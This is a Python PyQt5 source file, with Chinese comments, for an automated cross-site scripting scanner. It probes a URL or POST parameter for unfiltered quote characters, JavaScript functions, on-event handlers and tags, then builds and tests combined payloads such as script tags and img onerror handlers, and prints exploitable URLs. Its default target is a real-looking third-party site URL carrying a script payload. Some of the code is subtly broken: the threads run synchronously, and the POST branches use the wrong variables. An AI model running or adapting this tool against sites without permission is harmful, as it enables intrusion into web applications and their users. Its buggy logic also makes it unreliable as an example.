# coding=utf-8
import re
import sys
import threading
import time
import urllib.parse
from PyQt5.QtWidgets import QApplication, QMainWindow

from modules import format, lists
from modules.precheck import CheckPrepare
from ui.start import Ui_MainWindow
from PyQt5 import QtCore, QtGui
from PyQt5.QtCore import *
from data import payload, urldata

time_start = time_end = ""


class MyMainWindow(QMainWindow, Ui_MainWindow):
    def __init__(self, parent=None):
        super(MyMainWindow, self).__init__(parent)
        self.setupUi(self)
        # 执行函数
        # 如果不加 self，tt 只是一个局部变量，当初始化完成，该变量的生命周期就结束了，所以会报 QThread: Destroyed
        # while thread is still running
        self.myworker = Worker()
        self.startx.clicked.connect(lambda: self.myworker.start())
        # 获取控制台输出
        sys.stdout = EmittingStream(textWritten=self.normalOutputWritten)

    def __del__(self):
        # Restore sys.stdout
        sys.stdout = sys.__stdout__

    def normalOutputWritten(self, text):
        """Append text to the QTextEdit."""
        # Maybe QTextEdit.append() works as well, but this is how I do it:
        # cursor = self.textEdit.textCursor()
        cursor = self.output.textCursor()
        # print(cursor)
        cursor.movePosition(QtGui.QTextCursor.End)
        cursor.insertText(text)
        self.output.setTextCursor(cursor)
        self.output.ensureCursorVisible()


class EmittingStream(QtCore.QObject):
    textWritten = QtCore.pyqtSignal(str)

    def write(self, text):
        self.textWritten.emit(str(text))


class Worker(QThread):
    def __init__(self):
        super(Worker, self).__init__()

    def run(self):
        global time_start, time_end
        time_start = time.time()
        # if not len(myWin.input_url.text()):
        #         #     print("请输入目标 URL...")
        #         #     return # 退出逻辑线程
        #         # if not len(myWin.input_arg.text()):
        #         #     print("请输出注入参数...")
        #         #     return
        print("---------开始进行测试---------".center(170), "\n")
        payload.keyword_init()
        format.allclear()  # 输入2
        urldata.word = myWin.input_arg.text().strip()
        urldata.targeturl = myWin.input_url.text()
        if urldata.targeturl== "":
            urldata.targeturl = "http://m.cndits.com/product/visa/lists/zone_id/930400?var=<ScRipt>zhhkxa(6012);</ScRipt>"
        print("检测目标".center(170), "\n", urldata.targeturl)
        format.breakline()
        begin = CheckPrepare()
        begin.rebuild()
        begin.isurlok()
        if urldata.urlok== "no":
            return
        begin2 = CheckStart()
        begin2.check_close()
        begin2.check_action()
        begin2.check_onevent()
        begin2.check_tag()
        begin2.check_combination_close_no()
        begin2.check_combination_close_yes()
        # begin2.check_illusion()
        format.breakline()
        time_end = time.time()
        print("测试耗时：", time_end - time_start)


class CheckStart():

### 闭合符号测试

    def check_close(self):
        print("闭合测试...".center(170))
        while urldata.HTTP_METHON == "GET":
            # if re.search(re.escape("\"'>"),Check_Prepare.get_response(re.sub(re.escape("abcdef1234"), "\"'>", url_data.get_url))):
            #     payload.keyword_expand("\"'>")
            # payload.keyword.sort(key=lambda x:len(x))

            def get_start(pd):
                if re.search(
                    re.escape(
                        urllib.parse.unquote(
                            urllib.parse.unquote(pd))),
                        CheckPrepare.get_response(
                            self,
                            re.sub(
                        re.escape("abcdef1234"),
                        pd,
                                urldata.get_url))):  # 使用 re.escape()
                    # print("^^^".center(170))
                    # print(pd.center(170))
                    # print("GET测试：", re.sub(re.escape("abcdef1234"), pd, url_data.get_url))
                    # human_read.Dividing_line()
                    urldata.unsensitive['close'].append(pd)
                else:
                    urldata.sensitive['close'].append(pd)
            for i in payload.keyword['close']:
                mythread = threading.Thread(target=get_start(i))
                mythread.start()

            if re.search(
                r"/|%2f",
                lists.list_to_str(
                    urldata.unsensitive['close'])):
                for i in payload.keyword['close_tag']:
                    if re.search(
                            re.escape(
                                urllib.parse.unquote(
                                    urllib.parse.unquote(i))),
                            CheckPrepare.get_response(
                                self,
                                re.sub(
                                    re.escape("abcdef1234"),
                                    i,
                                    urldata.get_url))):

                        urldata.unsensitive['close_tag'].append(i)
                    else:
                        urldata.sensitive['close_tag'].append(i)

            [print("未过滤：", e.replace("591", "")) for e in urldata.unsensitive['close']]

            # 将未过滤的闭合字符整体输出
            str591=""
            for e in urldata.unsensitive['close']:
                str591+=e.replace("591", "")
            print("未过滤闭合字符串：", str591)

            # str1 = mymodule.list_to_str(
            #     url_data.unsensitive['close']).replace(
            #     "591", "")
            # print(str1)
            # human_read.human_read1(url_data.unsensitive)
            [print("过滤：", e.replace("591", ""))
             for e in urldata.sensitive['close']]
            if urldata.unsensitive['close_tag']:
                payload.keyword['others'] = lists.list_add_start(
                    payload.keyword['others'],
                    lists.list_to_str(
                        urldata.unsensitive['close_tag']).replace("591", ''))
            break


        while urldata.HTTP_METHON == "POST":
            # if re.search(re.escape("\"'>"),self.post_response(re.sub(re.escape("abcdef1234"), "\"'>", url_data.post_data))):
            #     payload.keyword_expand("\"'>")
            # payload.keyword.sort(key=lambda x:len(x))

            def post_start(pd):
                if re.search(
                    re.escape(
                        urllib.parse.unquote(
                            urllib.parse.unquote(pd))),
                        CheckPrepare.post_response(
                            self,
                            re.sub(
                        re.escape("abcdef1234"),
                        i,
                                urldata.post_data))):  # 使用 re.escape()
                    # print(i.center(170))
                    # print("POST测试：", re.sub(re.escape("abcdef1234"),i,url_data.post_data))
                    # human_read.Dividing_line()
                    urldata.unsensitive['close'].append(pd)
                else:
                    urldata.sensitive['close'].append(pd)
            for i in payload.keyword['close']:
                mythread = threading.Thread(target=post_start(i))
                mythread.start()

            if re.search(
                r"/|%2f",
                lists.list_to_str(
                    urldata.unsensitive['close'])):
                for i in payload.keyword['close_tag']:
                    if re.search(
                            re.escape(
                                urllib.parse.unquote(
                                    urllib.parse.unquote(i))),
                            CheckPrepare.post_response(
                                self,
                                re.sub(
                                    re.escape("abcdef1234"),
                                    i,
                                    urldata.post_data))):

                        urldata.unsensitive['close_tag'].append(i)
                    else:
                        urldata.sensitive['close_tag'].append(i)

            [print("未过滤：", e.replace("591", ""))
             for e in urldata.unsensitive['close']]  # .replace("591","")优化输出

            #### 将未过滤的闭合字符整体输出
            str591 = ""
            for e in urldata.unsensitive['close']:
                str591 += e.replace("591", "")
            print("未过滤闭合字符串：", str591)

            # human_read.human_read1(url_data.unsensitive)
            [print("过滤：", e.replace("591", ""))
             for e in urldata.sensitive['close']]
            if urldata.unsensitive['close_tag']:
                payload.keyword['others'] = lists.list_add_start(
                    payload.keyword['others'],
                    lists.list_to_str(
                        urldata.unsensitive['close_tag']).replace("591", ''))
            break
        if urldata.unsensitive['close']:
            urldata.signal['close'] = 'yes'
        print("url_data.signal.close:", urldata.signal['close'])



### 动作测试


    def check_action(self):
        format.breakline()
        print("函数测试...".center(170))



### 当 GET 时
        while urldata.HTTP_METHON == "GET":

### work 函数
            def get_start(pd):

                # replace("\\\\\\\\","\\\\") 是因为 unicode 编码之后，再使用urllib.parse.unquote（）会变成 8 个\，这时候正则匹配的是 4 个\，实际只需匹配 2 个\，所以要做个replace
                if re.search(re.escape(urllib.parse.unquote(urllib.parse.unquote(pd))).replace("\\\\\\\\","\\\\"), CheckPrepare.get_response(self, re.sub(re.escape("abcdef1234"), pd, urldata.get_url))):
                    urldata.unsensitive['action'].append(pd)
                else:
                    urldata.sensitive['action'].append(pd)




### 执行线程
            for i in payload.keyword['action']:
                mythread = threading.Thread(target=get_start(i))
                mythread.start()



### 输出结果
            [print("未过滤：", e.replace("592", ""))
             for e in urldata.unsensitive['action']]
            [print("过滤：", e.replace("591", ""))
             for e in urldata.sensitive['action']]
            break




### 当 POST 时

        while urldata.HTTP_METHON == "POST":
            # if re.search(re.escape("\"'>"),self.post_response(re.sub(re.escape("abcdef1234"), "\"'>", url_data.post_data))):
            #     payload.keyword_expand("\"'>")
            # payload.keyword.sort(key=lambda x:len(x))



### work 函数
            for i in payload.keyword['action']:
                if re.search(
                    re.escape(
                        urllib.parse.unquote(
                            urllib.parse.unquote(i))).replace("\\\\\\\\","\\\\"),
                        CheckPrepare.post_response(
                            self,
                            re.sub(
                        re.escape("abcdef1234"),
                        i,
                                urldata.post_data))):  # 使用 re.escape()
                    # print(i.center(170))
                    # print("POST测试：", re.sub(re.escape("abcdef1234"),i,url_data.post_data))
                    # human_read.Dividing_line()
                    urldata.unsensitive['action'].append(i)
                else:
                    urldata.sensitive['action'].append(i)



### 输出结果

            [print("未过滤：", e.replace("592", ""))
             for e in urldata.unsensitive['action']]  # .replace("591","")优化输出
            # human_read.human_read1(url_data.unsensitive)
            [print("过滤：", e.replace("591", ""))
             for e in urldata.sensitive['action']]
            break

        if "eval" in urldata.unsensitive['action']:
            print("eval(591)+onerror 组合使用，例如 <img src=x onerror=eval(\"alert('xss')\")></img>")

        if urldata.unsensitive['action']:
            urldata.signal['action'] = 'yes'
        print("url_data.signal.action:", urldata.signal['action'])



### ON 事件测试

    def check_onevent(self):
        format.breakline()
        print("on事件测试...".center(170))
        while urldata.HTTP_METHON == "GET":
            def get_start(pd):
                if re.search(
                    re.escape(
                        urllib.parse.unquote(
                            urllib.parse.unquote(pd))),
                        CheckPrepare.get_response(
                            self,
                            re.sub(
                        re.escape("abcdef1234"),
                        pd,
                                urldata.get_url))):  # 使用 re.escape()
                    urldata.unsensitive['onevent'].append(pd)
                else:
                    urldata.sensitive['onevent'].append(pd)

            for i in payload.keyword['onevent']:
                mythread = threading.Thread(target=get_start(i))
                mythread.start()

            [print("未过滤：", e.replace("591", ""))
             for e in urldata.unsensitive['onevent']]
            [print("过滤：", e.replace("591", ""))
             for e in urldata.sensitive['onevent']]
            break
        while urldata.HTTP_METHON == "POST":
            # if re.search(re.escape("\"'>"),self.post_response(re.sub(re.escape("abcdef1234"), "\"'>", url_data.post_data))):
            #     payload.keyword_expand("\"'>")
            # payload.keyword.sort(key=lambda x:len(x))
            for i in payload.keyword['onevent']:
                if re.search(
                    re.escape(
                        urllib.parse.unquote(
                            urllib.parse.unquote(i))),
                        CheckPrepare.post_response(
                            self,
                            re.sub(
                        re.escape("abcdef1234"),
                        i,
                                urldata.post_data))):  # 使用 re.escape()
                    # print(i.center(170))
                    # print("POST测试：", re.sub(re.escape("abcdef1234"),i,url_data.post_data))
                    # human_read.Dividing_line()
                    urldata.unsensitive['onevent'].append(i)
                else:
                    urldata.sensitive['onevent'].append(i)
            [print("未过滤：", e.replace("591", ""))
             for e in urldata.unsensitive['onevent']]  # .replace("591","")优化输出
            # human_read.human_read1(url_data.unsensitive)
            [print("过滤：", e.replace("591", ""))
             for e in urldata.sensitive['onevent']]
            break

### 结合输出 on 事件和动作组合
        print("\n"+"可利用触发动作(展示前10条):")
        iiss = 1
        for e1 in urldata.unsensitive['action']:
            while iiss > 10:
                break
            else:
                for e2 in urldata.unsensitive['onevent']:
                    print(e2.replace("591", "")+e1)
                    iiss += 1
                    while iiss > 10:
                        break   # return 可以跳出多层循环,break 跳出单层循环


        if urldata.unsensitive['onevent']:
            urldata.signal['onevent'] = 'yes'
        print("url_data.signal.onevent:", urldata.signal['onevent'])







### 标签测试

    def check_tag(self):
        format.breakline()
        print("HTML 标签测试...".center(170))
        while urldata.HTTP_METHON == "GET":
            def get_start(pd):
                if re.search(
                    re.escape(
                        urllib.parse.unquote(
                            urllib.parse.unquote(pd))),
                        CheckPrepare.get_response(
                            self,
                            re.sub(
                        re.escape("abcdef1234"),
                        pd,
                                urldata.get_url))):  # 使用 re.escape()
                    # print("^^^".center(170))
                    # print(pd.center(170))
                    # print("GET测试：", re.sub(re.escape("abcdef1234"), pd, url_data.get_url))
                    # human_read.Dividing_line()
                    print(urldata.unsensitive['tag'])
                    urldata.unsensitive['tag'].append(pd)
                else:
                    urldata.sensitive['tag'].append(pd)

            for i in payload.keyword['tag']:
                mythread = threading.Thread(target=get_start(i))
                mythread.start()

            [print("未过滤：", e.replace("591", ""))
             for e in urldata.unsensitive['tag']]
            [print("过滤：", e.replace("591", ""))
             for e in urldata.sensitive['tag']]
            break
        while urldata.HTTP_METHON == "POST":
            # if re.search(re.escape("\"'>"),self.post_response(re.sub(re.escape("abcdef1234"), "\"'>", url_data.post_data))):
            #     payload.keyword_expand("\"'>")
            # payload.keyword.sort(key=lambda x:len(x))
            for i in payload.keyword['tag']:
                if re.search(
                    re.escape(
                        urllib.parse.unquote(
                            urllib.parse.unquote(i))),
                        CheckPrepare.post_response(
                            self,
                            re.sub(
                        re.escape("abcdef1234"),
                        i,
                                urldata.post_data))):  # 使用 re.escape()
                    # print(i.center(170))
                    # print("POST测试：", re.sub(re.escape("abcdef1234"),i,url_data.post_data))
                    # human_read.Dividing_line()
                    urldata.unsensitive['tag'].append(i)
                else:
                    urldata.sensitive['tag'].append(i)
            [print("未过滤：", e.replace("591", ""))
             for e in urldata.unsensitive['tag']]  # .replace("591","")优化输出
            # human_read.human_read1(url_data.unsensitive)
            [print("过滤：", e.replace("591", ""))
             for e in urldata.sensitive['tag']]
            break
        if urldata.unsensitive['tag']:
            urldata.signal['tag'] = 'yes'
        print("url_data.signal.tag:", urldata.signal['tag'])






### 组合测试——不闭合标签

    def check_combination_close_no(self):
        format.breakline()
        print("组合测试（不闭合标签）...".center(170))



### 构造不闭合用的payload：闭合字符+%20+触发动作+%20,并存储到 payload.keyword['combination_close_no']
### 注意，因为是不闭合标签的 payload，所以「闭合字符」只包含'"%22%27,需要提出掉其他字符。

        str591 = ""
        for e in urldata.unsensitive['close']:
            if e =="%22591" or e =="%27591" or e =="\"591" or e=="\'591":
               str591 += e.replace("591", "")

        iiss = 1
        for e1 in urldata.unsensitive['action']:
            while iiss > 10:
                break
            else:
                for e2 in urldata.unsensitive['onevent']:
                    # print(str591+"%20"+e2.replace("591", "") + e1+"%20")
                    payload.keyword['combination_close_no'].append(str591 + "%20" + e2.replace("591", "") + e1 + "%20")
                    iiss += 1
                    while iiss > 10:
                        break  # return 会跳出整个函数,break 跳出单层循环

        print("payload.keyword['combination_close_no']:")
        for erer in payload.keyword['combination_close_no']:
            print(erer)



### 判断是否onevent 和 action 都被过滤

        if urldata.signal['action'] == urldata.signal['onevent'] == 'yes':
            pass
        else:
            print("弹窗函数 或 ON事件 全被过滤，不可弹窗，故不再做组合测试".center(7))
            return #return 退出整个函数





        while urldata.HTTP_METHON == "GET":
            def get_start(pd):
                if re.search(
                    re.escape(
                        urllib.parse.unquote(
                            urllib.parse.unquote(pd))),
                        CheckPrepare.get_response(
                            self,
                            re.sub(
                        re.escape("abcdef1234"),
                        pd,
                                urldata.get_url))):  # 使用 re.escape()

                    urldata.unsensitive['combination_close_no'].append(pd)
                else:
                    urldata.sensitive['combination_close_no'].append(pd)

            for i in payload.keyword['combination_close_no']:
                mythread = threading.Thread(target=get_start(i))
                mythread.start()

            print("组合测试完成，输出组合 payload 结果：")

            [print("可利用 payload(请手工测试)：", re.sub(re.escape("abcdef1234"), e, urldata.get_url))
             for e in urldata.unsensitive['combination_close_no']]

            break



### 还未找到实例测试 POST

        while urldata.HTTP_METHON == "POST":
            def post_start(pd):
                if re.search(
                    re.escape(
                        urllib.parse.unquote(
                            urllib.parse.unquote(pd))),
                        CheckPrepare.post_response(
                            self,
                            re.sub(
                        re.escape("abcdef1234"),
                        pd,
                                urldata.get_url))):  # 使用 re.escape()

                    urldata.unsensitive['combination_close_no'].append(pd)
                else:
                    urldata.sensitive['combination_close_no'].append(pd)

            for i in payload.keyword['combination_close_no']:
                mythread = threading.Thread(target=post_start(i))
                mythread.start()

            print("组合测试完成，输出组合 payload 结果：")

            [print("可利用 payload(请手工测试)：", "(POST)", re.sub(re.escape("abcdef1234"), e, urldata.post_data))
             for e in urldata.unsensitive['combination_close_no']]

            break



        # while urldata.HTTP_METHON == "POST":
        #     # if re.search(re.escape("\"'>"),self.post_response(re.sub(re.escape("abcdef1234"), "\"'>", url_data.post_data))):
        #     #     payload.keyword_expand("\"'>")
        #     # payload.keyword.sort(key=lambda x:len(x))
        #     for i in payload.keyword['others']:
        #         if re.search(
        #             re.escape(
        #                 urllib.parse.unquote(
        #                     urllib.parse.unquote(i))),
        #                 CheckPrepare.post_response(
        #                     self,
        #                     re.sub(
        #                 re.escape("abcdef1234"),
        #                 i,
        #                         urldata.post_data))):  # 使用 re.escape()
        #             print(i.center(170))
        #             print(
        #                 "注入成功：",
        #                 re.sub(
        #                     re.escape("abcdef1234"),
        #                     i,
        #                     urldata.post_data))
        #             format.breakline()
        #             urldata.unsensitive['others'].append(i)
        #         else:
        #             urldata.sensitive['others'].append(i)
        #     if urldata.unsensitive['others']:
        #         [print("未过滤：", e.replace("591", ""))
        #          for e in urldata.unsensitive['others']]  # .replace("591","")优化输出
        #     else:
        #         print("无综合 payload...")
        #     # human_read.human_read1(url_data.unsensitive)
        #     # [print("过滤：", e.replace("591", "")) for e in url_data.sensitive]
        #     break








### 组合测试——闭合标签

    def check_combination_close_yes(self):
            format.breakline()
            print("组合测试（闭合标签）...".center(170))


            ### 判断是否onevent 和 action 都被过滤

            if urldata.signal['action'] == urldata.signal['onevent'] == 'yes':
                pass
            else:
                print("弹窗函数 或 ON事件 全被过滤，不可弹窗，故不再做组合测试".center(7))
                return  # return 退出整个函数

            ### 构造 payload


            str591 = ""
            for e in urldata.unsensitive['close']:
                if e == "%22591" or e == "%27591" or e == "\"591" or e == "\'591":
                    str591 += e.replace("591", "")

            iiss = 1
            for e1 in urldata.unsensitive['tag']:
                if re.search(re.escape("script"), e1, re.IGNORECASE):
                    payload.keyword['combination_close_yes'].append(
                        "<ScRipt>"+urldata.unsensitive['action'][0]+"</ScRipt>" )

                if re.search(re.escape("<a>"), e1, re.IGNORECASE):
                    payload.keyword['combination_close_yes'].append(
                        "<A"+" "+urldata.unsensitive['onevent'][0].replace("591", "")+urldata.unsensitive['action'][0]+">"+"591</A>" )

                if re.search(re.escape("input"), e1, re.IGNORECASE):
                    payload.keyword['combination_close_yes'].append(
                        "<iNpUt"+" "+urldata.unsensitive['onevent'][0].replace("591", "")+urldata.unsensitive['action'][0]+">"+"591</iNpUt>" )

                if re.search(re.escape("img"), e1, re.IGNORECASE):
                    # if "src" in urldata.unsensitive['onevent'] and "onerror" in urldata.unsensitive['onevent']: # 用 in 匹配时注意大小写必须一致，这很烦，所以不用 in，用 re 匹配
                    if re.search(re.escape("src"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE) and re.search(re.escape("onerror"), "".join(urldata.unsensitive['onevent']), re.IGNORECASE):
                        payload.keyword['combination_close_yes'].append("<ImG"+" "+"scr=x"+" "+"OnErrOr="+urldata.unsensitive['action'][0])
                        # if re.search(re.escape("eval"), "".join(urldata.unsensitive['action']), re.IGNORECASE) :
                        #     payload.keyword['combination_close_yes'].append("<ImG"+" "+"scr=x"+" "+"OnErrOr="+''.join((r'\x%2x'%ord(c)for c in 'alert(591)')))


                # for e2 in urldata.unsensitive['onevent']:
                #     # print(str591+"%20"+e2.replace("591", "") + e1+"%20")
                #     payload.keyword['combination_close_no'].append(
                #         str591 + "%20" + e2.replace("591", "") + e1 + "%20")
                #     iiss += 1
                #     while iiss > 10:
                #         break  # return 会跳出整个函数,break 跳出单层循环

            print("payload.keyword['combination_close_yes']:")
            for erer in payload.keyword['combination_close_yes']:
                print(erer)



            while urldata.HTTP_METHON == "GET":
                def get_start(pd):
                    if re.search(
                            re.escape(
                                urllib.parse.unquote(
                                    urllib.parse.unquote(pd))),
                            CheckPrepare.get_response(
                                self,
                                re.sub(
                                    re.escape("abcdef1234"),
                                    pd,
                                    urldata.get_url))):  # 使用 re.escape()

                        urldata.unsensitive['combination_close_yes'].append(pd)
                    else:
                        urldata.sensitive['combination_close_yes'].append(pd)

                for i in payload.keyword['combination_close_yes']:
                    mythread = threading.Thread(target=get_start(i))
                    mythread.start()

                print("组合测试完成，输出组合 payload 结果：")

                [print("可利用 payload(请手工测试)：", re.sub(re.escape("abcdef1234"), e, urldata.get_url))
                 for e in urldata.unsensitive['combination_close_yes']]

                break

            ### 还未找到实例测试 POST

            while urldata.HTTP_METHON == "POST":
                def post_start(pd):
                    if re.search(
                            re.escape(
                                urllib.parse.unquote(
                                    urllib.parse.unquote(pd))),
                            CheckPrepare.post_response(
                                self,
                                re.sub(
                                    re.escape("abcdef1234"),
                                    pd,
                                    urldata.get_url))):  # 使用 re.escape()

                        urldata.unsensitive['combination_close_yes'].append(pd)
                    else:
                        urldata.sensitive['combination_close_yes'].append(pd)

                for i in payload.keyword['combination_close_yes']:
                    mythread = threading.Thread(target=post_start(i))
                    mythread.start()

                print("组合测试完成，输出组合 payload 结果：")

                [print("可利用 payload(请手工测试)：", "(POST)", re.sub(re.escape("abcdef1234"), e, urldata.post_data))
                 for e in urldata.unsensitive['combination_close_yes']]

                break






### 组合测试——闭合
#     def check_combination_close_yes(self):
#         format.breakline()
#         print("综合测试...".center(170))
#
# ### 判断是否存在跨站可能性
#
#         if not urldata.signal['action'] == urldata.signal['onevent'] == 'yes':
#             print("action和 onevent 均被过滤，不再进行综合测试...".center(7))
#             return
#
#
#         while urldata.HTTP_METHON == "GET":
#             def get_start(pd):
#                 if re.search(
#                     re.escape(
#                         urllib.parse.unquote(
#                             urllib.parse.unquote(pd))),
#                         CheckPrepare.get_response(
#                             self,
#                             re.sub(
#                         re.escape("abcdef1234"),
#                         pd,
#                                 urldata.get_url))):  # 使用 re.escape()
#                     # print("^^^".center(170))
#                     print(pd.center(170))
#                     # print("GET测试：", re.sub(re.escape("abcdef1234"), pd, url_data.get_url))
#                     format.breakline()
#                     urldata.unsensitive['others'].append(pd)
#                 else:
#                     urldata.sensitive['others'].append(pd)
#
#             for i in payload.keyword['others']:
#                 mythread = threading.Thread(target=get_start(i))
#                 mythread.start()
#
#             [print("未过滤：", e.replace("591", ""))
#              for e in urldata.unsensitive['others']]
#             [print("过滤：", e.replace("591", ""))
#              for e in urldata.sensitive['others']]
#             break
#         while urldata.HTTP_METHON == "POST":
#             # if re.search(re.escape("\"'>"),self.post_response(re.sub(re.escape("abcdef1234"), "\"'>", url_data.post_data))):
#             #     payload.keyword_expand("\"'>")
#             # payload.keyword.sort(key=lambda x:len(x))
#             for i in payload.keyword['others']:
#                 if re.search(
#                     re.escape(
#                         urllib.parse.unquote(
#                             urllib.parse.unquote(i))),
#                         CheckPrepare.post_response(
#                             self,
#                             re.sub(
#                         re.escape("abcdef1234"),
#                         i,
#                                 urldata.post_data))):  # 使用 re.escape()
#                     print(i.center(170))
#                     print(
#                         "注入成功：",
#                         re.sub(
#                             re.escape("abcdef1234"),
#                             i,
#                             urldata.post_data))
#                     format.breakline()
#                     urldata.unsensitive['others'].append(i)
#                 else:
#                     urldata.sensitive['others'].append(i)
#             if urldata.unsensitive['others']:
#                 [print("未过滤：", e.replace("591", ""))
#                  for e in urldata.unsensitive['others']]  # .replace("591","")优化输出
#             else:
#                 print("无综合 payload...")
#             # human_read.human_read1(url_data.unsensitive)
#             # [print("过滤：", e.replace("591", "")) for e in url_data.sensitive]
#             break
    def check_illusion(self):
        format.breakline()
        print("Illusion Testing".center(200))
        lists.iilusion_replace() #对 payload 进行校验
        # print(str(mymodule.keyword['illusion']))
        if not lists.keyword['illusion']:
            print("No Payload , quit now .".center(170))
            return
        while urldata.HTTP_METHON == "GET":
            def get_start(pd):
                if re.search(
                        re.escape(
                            urllib.parse.unquote(
                                urllib.parse.unquote(pd))),
                        CheckPrepare.get_response(
                            self,
                            re.sub(
                                re.escape("abcdef1234"),
                                pd,
                                urldata.get_url))):  # 使用 re.escape()
                    print(pd.center(170))
                    format.breakline()
                    urldata.unsensitive['illusion'].append(pd)
                else:
                    urldata.sensitive['illusion'].append(pd)

            for i in lists.keyword['illusion']:
                mythread = threading.Thread(target=get_start(i))
                mythread.start()

            [print("未过滤：", e.replace("591", ""))
             for e in urldata.unsensitive['illusion']]
            [print("过滤：", e.replace("591", ""))
             for e in urldata.sensitive['illusion']]
            break
        while urldata.HTTP_METHON == "POST":
            # if re.search(re.escape("\"'>"),self.post_response(re.sub(re.escape("abcdef1234"), "\"'>", url_data.post_data))):
            #     payload.keyword_expand("\"'>")
            # payload.keyword.sort(key=lambda x:len(x))
            for i in lists.keyword['illusion']:
                if re.search(
                        re.escape(
                            urllib.parse.unquote(
                                urllib.parse.unquote(i))),
                        CheckPrepare.post_response(
                            self,
                            re.sub(
                                re.escape("abcdef1234"),
                                i,
                                urldata.post_data))):  # 使用 re.escape()
                    print(i.center(170))
                    print(
                        "注入成功：",
                        re.sub(
                            re.escape("abcdef1234"),
                            i,
                            urldata.post_data))
                    format.breakline()
                    urldata.unsensitive['illusion'].append(i)
                else:
                    urldata.sensitive['illusion'].append(i)
            if urldata.unsensitive['illusion']:
                [print("未过滤：", e.replace("591", ""))
                 for e in urldata.unsensitive['illusion']]  # .replace("591","")优化输出
            else:
                print("无综合 payload...")
            # human_read.human_read1(url_data.unsensitive)
            # [print("过滤：", e.replace("591", "")) for e in url_data.sensitive]
            break


        format.breakline()

if __name__ == "__main__":
    app = QApplication(sys.argv)  # the standard way to init QT
    myWin = MyMainWindow()
    myWin.show()
    sys.exit(app.exec_())